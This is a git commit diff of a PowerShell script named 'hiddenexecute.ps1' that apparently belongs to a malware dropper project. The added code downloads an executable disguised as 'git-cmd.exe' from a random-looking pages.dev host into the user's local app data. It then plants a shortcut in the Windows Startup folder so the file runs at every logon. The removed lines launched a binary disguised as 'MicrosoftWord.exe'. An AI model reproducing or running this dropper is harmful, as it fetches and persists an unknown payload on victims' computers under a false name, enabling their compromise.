037275bb4ae2a039899eef13642aa9df20914dee
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-22 11:33:25 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,9 +1,25 @@
-$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
-$localPath = "$folderPath\MicrosoftWord.exe"
-
-if (-Not (Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath
+if (Test-Path "$env:USERPROFILE\git.msg") {
+    exit
+} else {
+    New-Item -Path "$env:USERPROFILE\git.msg" -ItemType "file"
 }
 
-Start-Process $localPath
+$destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
+$binFolder = "$env:LOCALAPPDATA\Git\bin"
+
+$folder = Split-Path -Path $destination
+if (-not (Test-Path -Path $folder)) {
+    New-Item -ItemType Directory -Path $folder
+}
+
+Invoke-WebRequest -Uri "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/Git/git-cmd.exe" -OutFile $destination
+
+if (-not (Test-Path -Path $binFolder)) {
+    New-Item -ItemType Directory -Path $binFolder
+}
+
+$WshShell = New-Object -ComObject WScript.Shell
+$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$Shortcut = $WshShell.CreateShortcut("$StartupFolder\GitCmd.lnk")
+$Shortcut.TargetPath = $destination
+$Shortcut.Save()
